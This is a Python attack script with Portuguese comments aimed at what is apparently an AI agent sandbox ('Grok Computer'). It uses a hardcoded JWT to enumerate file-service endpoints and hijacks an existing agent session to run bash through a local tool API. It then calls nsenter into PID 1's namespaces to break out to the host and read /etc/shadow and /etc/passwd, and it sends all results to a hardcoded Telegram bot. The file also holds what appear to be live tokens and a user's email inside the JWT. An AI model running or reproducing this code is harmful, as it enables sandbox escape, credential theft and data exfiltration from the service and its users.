#!/usr/bin/env python3
"""
Exploração final definitiva - Grok Files, API Grok Computer, e nsenter.
"""

import subprocess
import json
import requests
import os
import time
from datetime import datetime

TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
TELEGRAM_CHAT_ID = "230885588"
JWT = os.getenv("TERMINAL_JWT_VAL", "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiIyOGYwMDg5OC02NDQ3LTQzNDItYWU1ZS04YmM2NTdiNzYwNWIiLCJjaWQiOiJmMDFmMWVhOS0wYmUzLTQ5NWItOWI2Yy1kOTU3YWZiMzIwNTAiLCJlbWFpbCI6IndhbmRlcnNvbmx3bHdAZ21haWwuY29tIiwic2wiOiJMb2dnZWRJbiIsInB0IjoiMzJkZDVjNjktYzI5Mi00Zjk0LTlmN2QtM2ZhODYxZTg4MDBlIiwiZXhwIjoxNzg3ODA1ODM2LCJpYXQiOjE3ODc4MDIyMzZ9.XXXXX")  # substitua
GROK_SESSION_ID = "6518367e-1ae0-40c0-9cc6-21b350742329"

def run_cmd(cmd, timeout=30):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def send_telegram(text, parse_mode="Markdown"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}, timeout=10)
    except:
        pass

def send_file(filename, caption=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(filename, 'rb') as f:
            requests.post(url, files={'document': f}, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=30)
    except:
        pass

def send_data(data_dict):
    for key, content in data_dict.items():
        if not content or content == "N/A":
            continue
        if len(content) > 4000:
            tmp = f"/tmp/{key.replace('/','_').replace(' ','_')}.txt"
            with open(tmp, "w", encoding="utf-8", errors="ignore") as f:
                f.write(content)
            send_file(tmp, caption=f"📄 {key[:50]}")
            os.remove(tmp)
        else:
            send_telegram(f"📄 **{key}**\n```\n{content[:3000]}\n```")

# 1. Grok Files - obter conteúdo completo
def grok_files_endpoints():
    base = "https://files.grok.com"
    headers = {"Authorization": f"Bearer {JWT}"}
    endpoints = ["/v1/files", "/v1/list", "/api/v1/files", "/files", "/v1/users/me", "/v1/upload", "/v1/download", "/v1/share", "/v1/search"]
    results = {}
    for ep in endpoints:
        try:
            r = requests.get(base + ep, headers=headers, timeout=10)
            content = r.text if r.text else "(vazio)"
            # Se for JSON, tentar formatar
            if r.headers.get('content-type', '').startswith('application/json'):
                try:
                    parsed = r.json()
                    content = json.dumps(parsed, indent=2)
                except:
                    pass
            results[ep] = f"Status: {r.status_code}\n{content[:5000]}"
        except Exception as e:
            results[ep] = f"Erro: {e}"
    return results

# 2. API Grok Computer - usar sessão existente
def grok_computer_call(command):
    base = "http://127.0.0.1:4242"
    headers = {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json"}
    cmd_payload = {
        "method": "tools/call",
        "params": {
            "name": "bash",
            "arguments": {
                "command": command,
                "timeout": "30"
            }
        }
    }
    try:
        r = requests.post(
            f"{base}/sessions/{GROK_SESSION_ID}/tools/call",
            headers=headers,
            json=cmd_payload,
            timeout=30
        )
        return f"Status: {r.status_code}\n{r.text[:2000]}"
    except Exception as e:
        return f"Erro: {e}"

# 3. Comandos no host via nsenter
def host_commands():
    cmds = {
        "whoami": "whoami",
        "hostname": "hostname",
        "id": "id",
        "ps_aux": "ps auxfww",
        "netstat": "netstat -tulpn 2>/dev/null || ss -tulpn",
        "mount": "mount",
        "cat_shadow": "cat /etc/shadow 2>/dev/null || echo 'N/A'",
        "cat_passwd": "cat /etc/passwd 2>/dev/null || echo 'N/A'",
    }
    results = {}
    for name, cmd in cmds.items():
        # Usar nsenter com todos os namespaces
        full_cmd = f"nsenter -t 1 -m -u -i -n -p -- {cmd}"
        output = run_cmd(full_cmd, timeout=20)
        results[name] = output if output else "N/A"
    return results

def main():
    send_telegram("🚀 **Iniciando exploração final definitiva**")

    # 1. Grok Files - ver conteúdo
    send_telegram("🔍 Obtendo conteúdo dos endpoints Grok Files...")
    grok_data = grok_files_endpoints()
    send_data(grok_data)

    # 2. API Grok Computer - comando de teste
    send_telegram("🔄 Testando API Grok Computer com sessão existente...")
    grok_result = grok_computer_call("whoami")
    send_telegram(f"📄 **Grok API response**\n```\n{grok_result[:2000]}\n```")
    if "whoami" not in grok_result:
        send_telegram("⚠️ API Grok Computer não respondeu com o comando. Tentando outros métodos...")
        # 3. nsenter diretamente
        send_telegram("🔧 Executando comandos via nsenter...")
        host_results = host_commands()
        send_data(host_results)

    send_telegram("✅ **Exploração finalizada**")

if __name__ == "__main__":
    main()
